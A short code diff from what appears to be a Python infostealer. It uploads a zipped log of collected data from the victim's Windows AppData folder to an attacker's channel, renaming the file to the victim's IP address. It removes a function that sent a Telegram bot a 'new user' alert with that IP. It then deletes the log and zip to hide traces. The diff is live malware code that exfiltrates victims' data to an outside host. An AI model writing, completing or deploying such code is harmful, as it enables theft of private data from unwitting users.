@@ -391,13 +391,8 @@ def send_document(document):
 
 doc = open('C:\\\\Users\\\\' + username + '\\AppData\\Roaming\\Log.zip', 'rb')
 doc = io.BytesIO(doc.read())
-doc.name = 'Log.zip'
+doc.name = f'{ip}.zip'
 resp = send_document(doc)
 
-def send_text(text):
-    return requests.get('https://api.telegram.org/bot{}/sendMessage?chat_id={}&text='.format(token, telid) + text, proxies=proxies, timeout=100000)
-
-
-resp = send_text('Новый пользователь: ' + ip + '\n')
 shutil.rmtree('C:\\Users\\' + username + '\\AppData\\Roaming\\Log', ignore_errors=True)
 os.remove('C:\\Users\\' + username + '\\AppData\\Roaming\\Log.zip')
